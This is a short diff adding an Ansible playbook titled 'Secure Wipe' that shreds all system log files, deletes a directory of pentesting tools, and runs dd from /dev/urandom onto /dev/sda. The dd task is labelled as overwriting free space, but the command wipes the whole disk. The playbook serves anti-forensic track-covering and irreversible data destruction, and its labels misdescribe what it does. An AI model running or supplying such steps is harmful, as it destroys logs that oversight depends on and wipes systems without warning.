@@ -1,0 +1,9 @@
+- name: Secure Wipe
+  hosts: localhost
+  tasks:
+    - name: Shred logs
+      shell: "shred -u -z -n 10 /var/log/*.log"
+    - name: Remove pentesting tools
+      shell: "rm -rf /arsenal"
+    - name: Overwrite free disk space
+      shell: "dd if=/dev/urandom of=/dev/sda bs=1M"
